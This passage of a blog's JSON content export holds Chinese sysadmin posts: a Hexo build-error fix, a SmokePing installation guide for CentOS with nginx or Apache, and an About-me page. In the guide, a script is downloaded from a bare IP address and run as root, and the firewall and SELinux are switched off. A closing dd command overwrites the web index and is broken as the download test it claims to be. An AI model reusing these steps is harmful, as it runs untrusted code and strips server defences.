Promise._settlePromiseFromHandler (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:502:31) at Promise._settlePromise (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:559:18) at Promise._settlePromise0 (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:604:10) at Promise._settlePromises (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:683:18) at Promise._fulfill (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:628:18) at Promise._resolveCallback (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:423:57) at Promise._settlePromiseFromHandler (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:514:17) at Promise._settlePromise (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:559:18) at Promise._settlePromise0 (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:604:10) at Promise._settlePromises (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:683:18) at Promise._fulfill (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/promise.js:628:18) at /Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/nodeback.js:42:21 at /Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/graceful-fs/graceful-fs.js:78:16 at tryToString (fs.js:414:3) at FSReqWrap.readFileAfterClose [as oncomplete] (fs.js:401:12)INFO Start processingINFO Files loaded in 1.93 sWARN Partial widget/archives does not exist. (in common/sidebar.ejs)INFO 0 files generated in 2.55 s 解决方法：命令：npm install -S hexo-generator-json-content@1 --save 1234567891011121314151617181920212223242526➜ yangcvo.github.io git:(master) ✗ npm install -S hexo-generator-json-content@1 --save- hexo-util@0.6.0 node_modules/hexo-generator-json-content/node_modules/hexo-util- moment@2.17.1 node_modules/hexo-generator-json-content/node_modules/momentcamel-case@3.0.0 node_modules/camel-case -&gt; node_modules/hexo/node_modules/hexo-cli/node_modules/hexo-util/node_modules/camel-casecross-spawn@4.0.2 node_modules/cross-spawn -&gt; node_modules/hexo/node_modules/hexo-cli/node_modules/hexo-util/node_modules/cross-spawn- underscore@1.7.0 node_modules/underscore- underscore.string@2.3.3 node_modules/underscore.string- keyword-extractor@0.0.13 node_modules/keyword-extractorhexo-site@0.0.0 /Users/jules/Documents/github-yangc/blog/yangcvo.github.io├─┬ hexo@3.2.0│ └─┬ hexo-cli@1.0.2│ └─┬ hexo-util@0.6.0│ ├── highlight.js@9.9.0│ ├── html-entities@1.2.0│ └── striptags@2.1.1├─┬ hexo-deployer-git@0.2.0│ └─┬ hexo-util@0.6.0│ ├── camel-case@3.0.0│ └── cross-spawn@4.0.2├── hexo-generator-feed@1.1.0├── hexo-generator-json-content@1.4.0├── hexo-generator-sitemap@1.1.2└─┬ hexo-renderer-marked@0.2.11 └─┬ hexo-util@0.6.0 ├── camel-case@3.0.0 └── cross-spawn@4.0.2 然后在检查提交代码到Github上面：hexo d 12345678910➜ yangcvo.github.io git:(master) ✗ hexo dINFO Deploying: gitINFO Clearing .deploy_git folder...INFO Copying files from public folder...On branch masternothing to commit, working directory cleanTo https://github.com/yangcvo/yangcvo.github.io.git ecbf9bb..7db4064 HEAD -&gt; masterBranch master set up to track remote branch master from https://github.com/yangcvo/yangcvo.github.io.git.INFO Deploy done: git 参考： https://github.com/hexojs/hexo/issues/1080 解决Hexo博客的ERROR Process failed: layout/_partial/.DS_Store 参考：解决Hexo博客的ERROR Process failed: layout/_partial/.DS_Store","raw":null,"content":null,"categories":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/categories/Blog/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/tags/Blog/"}]},{"title":"用最简单的方式安装smokeping","slug":"性能监控/Somekeping/用最简单易懂的方式安装smokeping","date":"2014-04-19T04:33:03.000Z","updated":"2017-03-14T06:01:12.000Z","comments":true,"path":"2014/04/19/性能监控/Somekeping/用最简单易懂的方式安装smokeping/","link":"","permalink":"http://blog.yangcvo.me/2014/04/19/性能监控/Somekeping/用最简单易懂的方式安装smokeping/","excerpt":"","text":"smokeping这个监控还是很强大的，用这个监控是在第一家公司做IDC起家后面转型CDN云计算云加速。这个也是我学的最早的一款监控，在这里我用编译安装方式。也有脚本安装不过需要了解过somkeping安装过程会比较看的懂脚本。 适用于宽带运营商维护和IDC机房维护可以检测本地网络的到上级运营商出口这段路由各个节点的稳定性 可以检测本地网络到各主要门户网站的延时，丢包率，稳定性可以检测本地网络到各地游戏服务器的延时，丢包率，稳定性 smokeping缺点：不能在前台Web页面添加要检测的节点，必须在后台smokeping的配置文件中添加 安装前的准备： 操作系统：选择centOS6.5最小化版， 里面的RPM包基本上都是最新的。 注1: centOS 5.6版本在安装rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm包是会遇到依赖性问题，要求安装rpmlib包，但centOS5.6版本中的rpmlib版本较低，无法直接安装 注2：在安装centOS6.5时，要注意设置系统的IP地址，如下图,点击【configure network】按钮，选择【system eth0】, 点击 【IPv4Seting】,设置IP地址 注3: 选择安装包时，点选【Basic Server】, 要安装621个基本包 注4: 其他安装步骤，按照正常的安装流程操作即可 二. 安装过程修改时区 1\\cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 同步时间 1ntpdate time.nist.gov 写入BIOS 1hwclock -w 关闭防火墙 1service iptables stop 1. 安装第三方软件源123464位系统 rpm -Uvh http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm32位系统rpm -Uvh http://apt.sw.be/redhat/el6/en/i386/rpmforge/RPMS/rpmforge-release-0.5.3-1.el6.rf.i686.rpm 注：安装这个源后，接下来要安装的大量的依赖包就不会报错 123rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm sed -i 's/^#baseurl/baseurl/g' /etc/yum.repos.d/epel.reposed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/epel.repo 2. 安装rrdtool与依赖库1yum -y install perl perl-Net-Telnet perl-Net-DNS perl-LDAP perl-libwww-perl perl-RadiusPerl perl-IO-Socket-SSL perl-Socket6 perl-CGI-SpeedyCGI perl-FCGI perl-CGI-SpeedCGI perl-Time-HiRes perl-ExtUtils-MakeMaker perl-RRD-Simple rrdtool rrdtool-perl curl fping echoping httpd httpd-devel gcc make wget libxml2-devel libpng-devel glib pango pango-devel freetype freetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel mod_fastcgi screen wqy-zenhei-fonts.noarch wqy-zenhei-fonts-common.noarch lrzsz nginx 注：perl-CGI-SpeedyCGI，perl-CGI-SpeedCGI这两个包在安装过程中会提示找不到，但没关系注：用yum安装大量的依赖包还是很方便的，而百度上有些关于安装smokeping的文档要求使用wget下载后再用make,make install方式安装，虽然make方式不复杂，但通过make编译再安装几十个包就显得有点繁锁了。 3.下载与安装smokeping12345wget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.8.tar.gzwget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.11.tar.gz tar zxvf smokeping-2.6.8.tar.gzcd smokeping-2.6.8./configure --prefix=/usr/local/smokeping 出现问题是因为需要安装perl的模块，所以运行下面内容即可 1234567如果只出现 Config::Grammar' ... Failed解决 'Config::Grammar' ... Failedwget http://search.cpan.org/CPAN/authors/id/D/DS/DSCHWEI/Config-Grammar-1.10.tar.gztar zxvf Config-Grammar-1.10.tar.gzcd Config-Grammar-1.10perl Makefile.PLmake &amp;&amp; make install 如果出现很多个failed，就用下面的方法 1234567./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty 这个是为前面failed做安装 ./co nfigure --prefix=/usr/local/smokeping 如果还出现问题可以看下这里面的参考。http://bbs.51cto.com/thread-1106181-1.html/usr/bin/gmake install安装下yum install cpan perl -MCPAN -e 'install CGI' perl -MCPAN -e 'install CGI::Fast ' 这个安装好了然后再执行这一步。 如果上面提示CGI 没有安装成功。 1234567wgethttp://www.cpan.org/authors/id/M/MA/MARKSTOS/CGI.pm-3.65.tar.gztar zxvf CGI.pm-3.65.tar.gzcd CGI.pm-3.65perl Makefile.PLmake &amp;&amp; make install然后再执行下 ./configure --prefix=/usr/local/smokeping 现在smokeping安装完成 4. 配置smokeping第一种 使用nginx12341.安装nginxrpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpmyum install -y nginxhttps://metacpan.org/pod/release/MSTROUT/ExtUtils-MakeMaker-6.59/lib/ExtUtils/MakeMaker.pm 下载Make 让他直接执行 2.安装基础IO 123456cd /rootwget http://220.194.199.196/download/IO-All-0.46.tar.gztar xvzf IO-All-0.46.tar.gzcd IO-All-0.46perl Makefile.PL # 这里出现这个问题 把那个文件删了就行了。make &amp;&amp; make install 3.配置nginx的sock创建fcgi sock 文件，配置nginx fcgi使用 12345#wget http://autonagios.googlecode.com/svn/trunk/autonagios-20100103/files/nginx-fcgi.txt -O /etc/nginx-fcgiwget http://117.27.153.133/nginx-fcgi.txt -O /etc/nginx-fcgi chmod a+x /etc/nginx-fcgi/etc/nginx-fcgi -l /var/log/nginx-fcgi.log -pid /var/run/nginx-fcgi.pid -S /var/run/nginx-fcgi.sockchmod 777 /var/run/nginx-fcgi.sock 4.增加smokeping使用的data、var、和cache目录 123456cd /usr/local/smokepingmkdir data var cachemv htdocs/smokeping.fcgi.dist htdocs/smokeping.fcgicd /usr/local/smokeping/etcmv config.dist configchmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist 5.上传监控节点conf文件到smokeping的etc目录6.修改smokpeing配置脚本 123456789101112131415vi config在如下位置修改*** Database ***step = 300pings = 20修改为*** Database ***step = 60pings = 20在如下位置添加一句话*** Presentation ***template = /usr/local/smokeping/etc/basepage.html.distcharset=utf-8 在第一个加号位置下将监控节点文件引入，如下例子 1234567+ testnetworkmenu=测试网络状况title= 测试网络状况@include CT-IP.conf@include CN-IP.conf@include CT_IDC.conf@include CNC-IDC.conf 保存退出 7.增加data、var、cache目录的软连接 123ln -s /usr/local/smokeping/data/ /usr/share/nginx/html/dataln -s /usr/local/smokeping/cache/ /usr/share/nginx/html/cacheln -s /usr/local/smokeping/htdocs/cropper/ /usr/share/nginx/html/cropper 8.修改nginx 配置文件查看下nginx的版本，使用nginx -v 查看，如下例子： 12 nginx -vnginx version: nginx/1.0.15 修改nginx配置 1234567891011vi /etc/nginx/conf.d/default.conf--增加fcgi 指向 location ~ .*\\.fcgi$ &#123; root /usr/local/smokeping/htdocs/; gzip off; fastcgi_pass unix:/var/run/nginx-fcgi.sock; fastcgi_index smokeping.fcgi; include fastcgi.conf; #1.0.x 与0.8.x 用这个 #include fastcgi_params; #1.4.x版本用 fastcgi_params #fastcgi_param SCRIPT_FILENAME /opt/smokeping/htdocs$fastcgi_script_name; #1.4.x版本必加 &#125; 保存退出 第二种 使用apache(1) 创建cache、data、var目录 12cd /usr/local/smokepingmkdir htdocs/cache data var (2) 在创建日志 1touch /var/log/smokeping.log (3) 上传监控节点的conf文件到smokeping的etc目录下修改smokeping目录的用户和组权限 12chown apache:apache -R /usr/local/smokepingchown apache:apache /var/log/smokeping.log (4) 修改配置文件 12345678910111213141516171819202122232425262728cd /usr/local/smokeping/htdocs/mv smokeping.fcgi.dist smokeping.fcgicd /usr/local/smokeping/etcmv config.dist configvi config修改改行设置imgcache = /usr/local/smokeping/cacheimgcache = /usr/local/smokeping/htdocs/cache *** Database ***step = 300pings = 60然后修改step，从300改为60，这是检测的时间, pings 从20 改为60, 即60秒ping 60次在如下位置添加一句话*** Presentation ***template = /usr/local/smokeping/etc/basepage.html.distcharset=utf-8在第一个加号位置下将监控节点文件引入，如下例子+ testnetworkmenu=测试网络状况title= 测试网络状况@include CT-IP.conf@include CN-IP.conf@include CT_IDC.conf@include CNC-IDC.conf 保存退出 (5) 配置完成之后修改密码文件权限 1chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist 修改apache的配置 12345678910111213141516vim /etc/httpd/conf/httpd.conf在DocumentRoot \"/var/www/html\" 这一行之下添加如下内容：Alias /cache \"/usr/local/smokeping/htdocs/cache\"Alias /cropper \"/usr/local/smokeping/htdocs/cropper\"Alias /smokeping \"/usr/local/smokeping/htdocs\"&lt;Directory \"/usr/local/smokeping/htdocs\"&gt; AllowOverride None AddHandler cgi-script .fcgi .cgi Options ExecCGI &lt;IfModule dir_module&gt; DirectoryIndex smokeping.fcgi &lt;/IfModule&gt; Order allow,deny Allow from all &lt;/Directory&gt; 设置开机启动httpd, smokeping,并关闭iptables. 1234echo \"/usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log 2&gt;&amp;1 &amp;\" &gt;&gt; /etc/rc.localchkconfig httpd on #开机启动httpd进程chkconfig iptables off #开机不启动iptables服务chkconfig nginx on 启动http或者nginx以及smokeping 123service httpd start service nginx start/usr/local/smokeping/bin/smokeping --debug-daemonchown apache:apache -R /usr/local/smokeping 打开检测主机的Web页面. 使用httpd做web，在Web浏览器里输入http://您的监控主机IP/smokeping 这里启动不了，看下什么原因。是不是CT-IDC.conf 没有上传到etc下面 打开这里出现500 说明配置正确防火墙看下。serenfroce 0 有没有关闭。 使用nginx做web，在Web浏览器里输入 http://您的监控主机IP/smokeping.fcgi 这里启动不了，看下什么原因。是不是CT-IDC.conf 没有上传到etc下面 如果遇到500错误： 123456789101112Internal Server ErrorThe server encountered an internal error or misconfiguration and was unable to complete your request.Please contact the server administrator, root@localhost and inform them of the time the error occurred, and anything you might have done that may have caused the error.More information about this error may be available in the server error log.--------------------------------------------------------------------------------Apache/2.2.15 (CentOS) Server at 192.168.2.101 Port 80说明没有关闭SElinux 选项，关闭就正常了vi /etc/sysconfig/selinuxSELINUX=permissive[root@localhost ~]# getenforce #查看SElinux 的命令Permissive #返回的结果是Permissive, 表示已经关闭SElinux了 在Web页面增加验证用户名和密码(可选步骤) 1234567891011121314(1)修改httpd.conf里的内容&lt;Directory \"/usr/local/smokeping\"&gt;AllowOverride NoneOptions AllAddHandler cgi-script .fcgi .cgiAllowOverride AuthConfigOrder allow,denyAllow from allAuthName \"Smokeping\"AuthType BasicAuthUserFile /usr/local/smokeping/htdocs/htpasswdRequire valid-userDirectoryIndex smokeping.fcgi&lt;/Directory&gt; 注：上面的内容部分已经添加，这里仅添加红色字体内容即可。 (2) 设置登录账户与密码进入cd /usr/local/smokeping/htdocs目录， 执行命令：htpasswd -c /usr/local/smokeping/htdocs/htpasswd admin这个是设置登录账户为admin，密码在后面输入，然后重启httpd就可以实现密码验证登录重新登录web页面，会要求输入用户名和密码. 一定要同步好时间 在ESXI4的虚拟机中，定期执行ntpdate 210.72.145.44 #或者与本地的时间服务器同步在vmware workstation中，安装vmware-tools， 虚拟机的时间会自动与其宿主机时间同步 注： 如果vmware workstation中的虚拟机不安装vmware-tools，则虚拟机时间会与宿主机时间相隔整整8个小时(虚拟机时间早于宿主机时间) vmware-tools的安装不在此叙述 特别说明: 修改/usr/local/smokeping/etc/config 文件的配置参数，必须重启动smokeping程序 12345(1)如果重启动smokeping程序失败，根据报错提示删除/usr/local/smokeping/data子文件夹的rrd文件(2)中文问题：如果需要在网页里展示中文，修改/usr/local/smokeping/etc的config文件*** Presentation ***charset = utf-8 //注：在这里添加然后在menu与titile里修改中文，重启即可 有一个要注意的地方就是，你输入的中文必须在utf-8的字符编码下输入的中文字符，不然会出现乱码。 如果在xshel下，选择file-properities-terminal如果还是不显示就看看你系统里是否安装了中文字体，或者在安装一个 123456789[root@smokeping data]# ps -ef |grep smoke #查找smokeping进程root 8740 1 0 09:08 ? 00:00:00 /usr/local/smokeping/bin/smokeping [FPing]root 35552 35529 0 09:33 pts/2 00:00:00 grep smoke[root@smokeping data]# kill 8740 #杀掉smokeping进程[root@smokeping data]# ps -ef |grep smokeroot 35554 35529 4 09:33 pts/2 00:00:00 grep smokesmokeping进程已经被杀掉[root@smokeping data]#screen #如果通过SSH远程登录到监控主机，最后执行screen，在虚拟窗口中启动smokeping/usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log 2&gt;&amp;1 &amp; 三. 添加需要监控的网站和节点(在/usr/local/smokeping/etc/config中添加) smokeping就这点不好，添加节点不能在前台Web页面添加，一定要在后台的配置文件中添加,希望以后的版本中能改进一下 * 修改/usr/local/smokeping/etc/config 后，必须重启smokeping 程序，配置才会生效 * smokeping 会根据配置文件config 在/usr/local/smokeping/data 之下添加moniter文件夹，其下包含website子文件夹 * 用vmware workstation的虚拟机测试有一点好处，workstation下的虚拟网卡可以设置出入的丢包率，适合smokeping做丢包测试, 经过测试smokeping检测出的丢包率与vmware worksation虚拟网卡设置的丢包率基本相同,也就是说smokeping 能够反应网络的真实状况 * 添加监控节点示例：注意+是第一层，++是第二层，+++ 是第三层 123456789101112131415161718192021222324252627282930313233343536+ moniter menu = moniter++ websitemenu = websitetitle = moniter website#host = /moniter/website/baidu /moniter/website/sina /moniter/website/taobao /moniter/website/QQ+++ baidumenu = baidutitle = baidu.comalerts = somelosshost = www.baidu.com+++ sinamenu = sinatitle = sina.com.cnalerts = somelosshost = www.sina.com.cn+++ taobaomenu = taobaotitle = taobao.comalerts = somelosshost = www.taobao.com+++ QQmenu = QQtitle = QQalerts = somelosshost = www.qq.com.cn+++ sohumenu = sohutitle = sohualerts = somelosshost = www.sohu.com 效果图：当前菜单下主机延时，丢包图 效果图：当前菜单下某主机延时，丢包详细图 13.图例说明 绿块表示不丢包，其他颜色的块表示不同程序的丢包。图形越平稳，表示网络越稳定，如果图形峰值和低谷很多，则表示网络时延不稳定，忽高忽低。 这里apache 如果要你做个URL的文件下载测试 1dd if=/dev/null bs=1M count=1 of=/var/www/html/index.html","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"Smokeping","slug":"Smokeping","permalink":"http://blog.yangcvo.me/tags/Smokeping/"},{"name":"IDC监控","slug":"IDC监控","permalink":"http://blog.yangcvo.me/tags/IDC监控/"}]},{"title":"About-me","slug":"个人生活记录/About-me","date":"2014-03-21T10:53:54.000Z","updated":"2017-03-14T05:55:05.000Z","comments":true,"path":"2014/03/21/个人生活记录/About-me/","link":"","permalink":"http://blog.yangcvo.me/2014/03/21/个人生活记录/About-me/","excerpt":"","text":"122016-1 - ????.? 美年大健康-优健康 2014.4 - 2015.12 mmtrix 高升控股 My dearest reader Welcome to my blog. I doubt you got to it by accident. With any luck, you got to it because of a search result. If so, I really hope I managed to answer any questions you may have had. With any luck on your part and skill on mine, you not only had your question answered, but had questions you didn’t know you had get answered as well! Not only that, but you stuck around long enough to visit this page and read about me. Thanks! My name is, as the site title says, chengyangyang. I went to school for computers and ended up learning about business instead. Sure enough, I thought I knew what I needed to run a successful business.I may have done alright, but it’s not for me. I need to be in front of a terminal emulator, not in front of a room full of people. That’s why I am where I am now. I’m a Linux server administrator. I’m passionate about the work I do and strive to learn more every day. From time to time I will run into weird and peculiar issues that take a lot of effort to solve. Sometimes I get questions that I have answered many times before. My blog is my repository for solutions and answers. My goal is to Keep IT DRY. Please check out that page for a complete description of what I mean. If you have something that I should add, let me know. I’m easy to find and always looking for new useful content! Here’s my contact: 📬 yangcvo[at]gmail.com 🐧 QQ:1165958741 个人简历：gurudigger 欢迎加我QQ和加入技术讨论群： Linux shell_高级运维派: 459096184Docker-虚拟化技术交流 ：521621407 也交流hadoop大数据方面 14年开始用的百家📖 iteye博客：http://yango.iteye.com - 现在已不更新了。 互相学习与交流加我QQ或者发mail给我。😊","raw":null,"content":null,"categories":[{"name":"个人生活记录","slug":"个人生活记录","permalink":"http://blog.yangcvo.me/categories/个人生活记录/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"}]}]}